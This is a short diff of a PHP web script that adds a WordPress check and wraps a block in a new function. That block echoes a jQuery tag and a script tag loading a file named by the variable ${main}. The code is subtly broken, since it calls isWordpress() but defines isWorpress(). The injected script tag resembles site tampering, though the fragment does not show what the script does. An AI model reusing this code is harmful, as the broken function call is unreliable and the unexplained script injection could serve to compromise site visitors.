@@ -156,12 +156,27 @@ fclose($myfile);
 }
 
 $me = basename($_SERVER['PHP_SELF']);
+
+$filename = 'wp-blog-header.php';
+
+if (file_exists($filename)) {
+    echo "The file $filename exists";
+    isWordpress();
+    exit;
+}
+
+
+
+
+function isWorpress(){
+
 if($me !== 'index.php'){
     
 echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
 echo "<script type='text/javascript' src='/script/${main}'></script>";
     echo "hello";
     exit;
+}
 }
 ?>
 
